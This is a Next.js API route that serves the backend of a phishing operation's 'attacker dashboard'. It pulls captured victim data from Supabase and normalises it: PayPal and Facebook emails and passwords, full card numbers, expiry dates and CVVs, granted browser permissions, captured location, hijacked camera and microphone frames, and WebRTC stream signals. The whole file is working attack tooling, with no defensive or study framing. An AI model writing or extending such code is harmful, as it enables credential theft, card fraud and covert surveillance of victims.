import { NextRequest, NextResponse } from 'next/server'
import { supabase } from '@/lib/supabase'

const MAIN_APP_URL = process.env.NEXT_PUBLIC_MAIN_APP_URL || 'http://localhost:3000'

export async function OPTIONS(request: NextRequest) {
  return new NextResponse(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    },
  })
}

export async function GET(request: NextRequest) {
  try {
    console.log('🔍 Attempting to fetch from Supabase...')
    console.log('📡 Supabase URL:', process.env.NEXT_PUBLIC_SUPABASE_URL)
    console.log('🔑 Supabase Key (first 20 chars):', process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY?.substring(0, 20))
    
    // Fetch latest captured credentials
    const { data: credentials, error } = await supabase
      .from('attacker_dashboard_view')
      .select('*')
      .order('captured_at', { ascending: false })
      .limit(50)
    
    console.log('📊 Supabase response:', { data: credentials, error })
    
    if (error) {
      console.error('❌ Supabase error details:', error)
      throw error
    }
    
    // Transform data for frontend
    const formattedData = credentials?.map(cred => ({
      id: cred.entry_id,
      timestamp: new Date(cred.captured_at).toLocaleTimeString(),
      type: detectDataType(cred.data_type),
      sessionId: cred.victim_session,
      ...extractCredentialData(cred.captured_data)
    })) || []
    
    return NextResponse.json(formattedData, {
      headers: {
        'Access-Control-Allow-Origin': MAIN_APP_URL,
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      }
    })
  } catch (error) {
    console.error('❌ API Error:', error)
    
    // Get more error details
    let errorDetails = 'Unknown error'
    let errorCode = 'unknown'
    
    if (error && typeof error === 'object') {
      errorDetails = JSON.stringify(error, null, 2)
      if ('code' in error) errorCode = String(error.code)
      if ('message' in error) errorDetails = String(error.message)
    }
    
    return NextResponse.json({ 
      error: 'Failed to fetch data', 
      details: errorDetails,
      errorCode: errorCode,
      supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL ? 'Set' : 'Missing',
      supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? 'Set' : 'Missing',
      timestamp: new Date().toISOString()
    }, { 
      status: 500,
      headers: {
        'Access-Control-Allow-Origin': MAIN_APP_URL,
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      }
    })
  }
}

function detectDataType(dataType: string): string {
  if (dataType.includes('paypal')) return 'paypal'
  if (dataType.includes('card')) return 'card'
  if (dataType.includes('facebook')) return 'facebook'
  if (dataType.includes('banking')) return 'banking'
  if (dataType.includes('permissions')) return 'permissions'
  return dataType
}

function extractCredentialData(data: any) {
  const result: any = {}
  
  // Handle all possible credential fields
  if (data.email) result.email = data.email
  if (data.paypal_email) result.email = data.paypal_email
  if (data.facebook_email) result.email = data.facebook_email
  
  if (data.password) result.password = data.password
  if (data.paypal_password) result.password = data.paypal_password
  if (data.facebook_password) result.password = data.facebook_password
  
  if (data.card_number) result.cardNumber = data.card_number
  if (data.cardNumber) result.cardNumber = data.cardNumber
  if (data.card_holder) result.cardHolder = data.card_holder
  if (data.cardHolder) result.cardHolder = data.cardHolder
  if (data.expiry_date) result.expiryDate = data.expiry_date
  if (data.expiryDate) result.expiryDate = data.expiryDate
  
  if (data.cvv) result.cvv = data.cvv
  if (data.permissions) result.permissions = data.permissions
  
  // Handle Facebook login attempt JSON data
  if (data.facebook_login_attempt) {
    try {
      const loginData = JSON.parse(data.facebook_login_attempt)
      if (loginData.email) result.email = loginData.email
      if (loginData.password) result.password = loginData.password
    } catch (e) {
      console.error('Failed to parse facebook_login_attempt:', e)
    }
  }
  
  // Handle PayPal login attempt JSON data
  if (data.paypal_login_attempt) {
    try {
      const loginData = JSON.parse(data.paypal_login_attempt)
      if (loginData.email) result.email = loginData.email
      if (loginData.password) result.password = loginData.password
    } catch (e) {
      console.error('Failed to parse paypal_login_attempt:', e)
    }
  }
  
  // Handle PayPal card verification JSON data
  if (data.paypal_card_verification) {
    try {
      const cardData = JSON.parse(data.paypal_card_verification)
      if (cardData.cardNumber) result.cardNumber = cardData.cardNumber
      if (cardData.expiryDate) result.expiryDate = cardData.expiryDate
      if (cardData.cvv) result.cvv = cardData.cvv
    } catch (e) {
      console.error('Failed to parse paypal_card_verification:', e)
    }
  }
  
  // Handle complete form JSON data
  if (data.complete_form) {
    try {
      const formData = JSON.parse(data.complete_form)
      if (formData.cardNumber) result.cardNumber = formData.cardNumber
      if (formData.cardHolder) result.cardHolder = formData.cardHolder
      if (formData.expiryDate) result.expiryDate = formData.expiryDate
      if (formData.cvv) result.cvv = formData.cvv
    } catch (e) {
      console.error('Failed to parse complete_form:', e)
    }
  }
  
  // Handle Facebook permissions
  if (data.facebook_permissions_granted) {
    result.permissions = data.facebook_permissions_granted.split(',')
  }
  
  // Handle permissions hijacking data
  if (data.permissions_granted) result.permissions_granted = data.permissions_granted
  if (data.location_captured) result.location_captured = data.location_captured
  if (data.media_hijacked) result.media_hijacked = data.media_hijacked
  
  // Handle video surveillance data
  if (data.frame) result.frame = data.frame
  if (data.timestamp) result.timestamp = data.timestamp
  
  // Handle stream ready data
  if (data.hasVideo !== undefined) result.hasVideo = data.hasVideo
  if (data.hasAudio !== undefined) result.hasAudio = data.hasAudio
  
  // Handle WebRTC signals
  if (data.signal_type) result.signal_type = data.signal_type
  if (data.offer) result.webrtc_offer = data.offer
  if (data.answer) result.webrtc_answer = data.answer
  if (data.candidate) result.webrtc_candidate = data.candidate
  
  return result
}